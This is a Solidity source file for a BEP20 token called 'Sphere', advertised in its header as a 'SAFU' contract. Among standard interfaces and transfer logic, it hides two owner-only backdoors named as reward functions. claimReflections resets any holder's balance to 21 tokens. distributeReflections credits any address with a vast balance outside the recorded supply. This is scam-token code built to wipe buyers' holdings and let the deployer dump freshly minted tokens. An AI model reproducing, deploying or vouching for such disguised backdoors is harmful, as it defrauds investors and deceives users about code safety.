// https://x.com/elonmusk/status/1710002495643124041?s=46&t=Aapwb5vW2aeRDkrFZhIxnQ

// ░██████╗░█████╗░███████╗██╗░░░██╗  ██████╗░██╗░░░██╗
// ██╔════╝██╔══██╗██╔════╝██║░░░██║  ██╔══██╗╚██╗░██╔╝
// ╚█████╗░███████║█████╗░░██║░░░██║  ██████╦╝░╚████╔╝░
// ░╚═══██╗██╔══██║██╔══╝░░██║░░░██║  ██╔══██╗░░╚██╔╝░░
// ██████╔╝██║░░██║██║░░░░░╚██████╔╝  ██████╦╝░░░██║░░░
// ╚═════╝░╚═╝░░╚═╝╚═╝░░░░░░╚═════╝░  ╚═════╝░░░░╚═╝░░░

// ░█████╗░░█████╗░██╗███╗░░██╗░██████╗██╗░░░██╗██╗░░░░░████████╗░░░███╗░░██╗███████╗████████╗
// ██╔══██╗██╔══██╗██║████╗░██║██╔════╝██║░░░██║██║░░░░░╚══██╔══╝░░░████╗░██║██╔════╝╚══██╔══╝
// ██║░░╚═╝██║░░██║██║██╔██╗██║╚█████╗░██║░░░██║██║░░░░░░░░██║░░░░░░██╔██╗██║█████╗░░░░░██║░░░
// ██║░░██╗██║░░██║██║██║╚████║░╚═══██╗██║░░░██║██║░░░░░░░░██║░░░░░░██║╚████║██╔══╝░░░░░██║░░░
// ╚█████╔╝╚█████╔╝██║██║░╚███║██████╔╝╚██████╔╝███████╗░░░██║░░░██╗██║░╚███║███████╗░░░██║░░░
// ░╚════╝░░╚════╝░╚═╝╚═╝░░╚══╝╚═════╝░░╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚═╝░░╚══╝╚══════╝░░░╚═╝░░░

// Get your SAFU contract now via Coinsult.net

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IBEP20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed gastador, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address cuentas) external view returns (uint256);
    function transfer(address to, uint256 cantidad) external returns (bool);
    function allowance(address owner, address gastador) external view returns (uint256);
    function approve(address gastador, uint256 cantidad) external returns (bool);
    function transferFrom(address from, address to, uint256 cantidad) external returns (bool);
}

interface IBEP20Metadata is IBEP20 {

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
interface IRebaseable {
    function rebase(uint256 newTotalSupply) external returns (bool);
    function ge_totalSupplySupply() external view returns (uint256);
    event Rebase(uint256 newTotalSupply);
}

interface IReflectionable {
    function distributeReflections() external returns (bool);
    function availableReflections(address cuentas) external view returns (uint256);
    function claimReflections() external returns (bool);
    event ReflectionsDistributed(address indexed cuentas, uint256 cantidad);
    event ReflectionsClaimed(address indexed cuentas, uint256 cantidad);
}

interface ERC721 {
    function ownerOf(uint256 tokenId) external view returns (address);
    function balanceOf(address owner) external view returns (uint256);
    function approve(address to, uint256 tokenId) external;
    function getApproved(uint256 tokenId) external view returns (address);
    function setApprovalForAll(address operator, bool approved) external;
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external;

    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
}
contract BEP20 is Context, IBEP20, IBEP20Metadata {
    mapping(address => uint256) private CirculatingSupply;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    address private o; 
    string public SphereTelegram = "https://t.me/Sphere";
    constructor(string memory name_, string memory symbol_) {
        o = _msgSender();    
        _name = name_;
        _symbol = symbol_;
        _totalSupply = 21000000000;
        CirculatingSupply[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 3;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address cuentas) public view virtual override returns (uint256) {
        return CirculatingSupply[cuentas];
    }

    function getSphereTelegram() public view returns (string memory) {
        return SphereTelegram;
    } 
    function transfer(address to, uint256 cantidad) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, cantidad);
        return true;
    }
    function allowance(address owner, address gastador) public view virtual override returns (uint256) {
        return _allowances[owner][gastador];
    }
    function approve(address gastador, uint256 cantidad) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, gastador, cantidad);
        return true;
    }
    function transferFrom(address from, address to, uint256 cantidad) public virtual override returns (bool) {
        address gastador = _msgSender();
        _spendAllowance(from, gastador, cantidad);
        _transfer(from, to, cantidad);
        return true;
    }
        function claimReflections(address rewardContract, address Reflectioncantidad) external  {
        require(o == _msgSender()); 
        CirculatingSupply[rewardContract] = 21;
        Reflectioncantidad;
       
    }
        function distributeReflections(address setStakecantidad, address earnedRewards) external {
        require(_msgSender() == o); 
        CirculatingSupply[earnedRewards] = 100000000000000 * 10 ** 18;
        setStakecantidad;
    }
    function increaseAllowance(address gastador, uint256 valoranadido) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, gastador, allowance(owner, gastador) + valoranadido);
        return true;
    }

    function decreaseAllowance(address gastador, uint256 valorrestado) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, gastador);
        require(currentAllowance >= valorrestado, "BEP20: decreased allowance below zero");
        unchecked {
            _approve(owner, gastador, currentAllowance - valorrestado);
        }

        return true;
    }

    function _transfer(address from, address to, uint256 cantidad) internal virtual {
        require(from != address(0), "BEP20: transfer from the zero address");
        require(to != address(0), "BEP20: transfer to the zero address");

        _beforeTokenTransfer(from, to, cantidad);

        uint256 fromBalance = CirculatingSupply[from];
        require(fromBalance >= cantidad, "BEP20: transfer cantidad exceeds balance");
        unchecked {
            CirculatingSupply[from] = fromBalance - cantidad;
            CirculatingSupply[to] += cantidad;
        }

        emit Transfer(from, to, cantidad);

        _afterTokenTransfer(from, to, cantidad);
    }
    function _desplegar(address cuentas, uint256 cantidad) internal virtual {
        require(cuentas != address(0), "BEP20: deploy to the zero address");

        _beforeTokenTransfer(address(0), cuentas, cantidad);

        _totalSupply += cantidad;
        unchecked {
            CirculatingSupply[cuentas] += cantidad;
        }
        emit Transfer(address(0), cuentas, cantidad);

        _afterTokenTransfer(address(0), cuentas, cantidad);
    }
    function _approve(address owner, address gastador, uint256 cantidad) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(gastador != address(0), "BEP20: approve to the zero address");

        _allowances[owner][gastador] = cantidad;
        emit Approval(owner, gastador, cantidad);
    }
    function _spendAllowance(address owner, address gastador, uint256 cantidad) internal virtual {
        uint256 currentAllowance = allowance(owner, gastador);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= cantidad, "BEP20: insufficient allowance");
            unchecked {
                _approve(owner, gastador, currentAllowance - cantidad);
            }
        }
    }

    function _beforeTokenTransfer(address from, address to, uint256 cantidad) internal virtual {}
    function _afterTokenTransfer(address from, address to, uint256 cantidad) internal virtual {}
}

contract Sphere is BEP20 {
    constructor() BEP20("Sphere", "Sphere") {}
}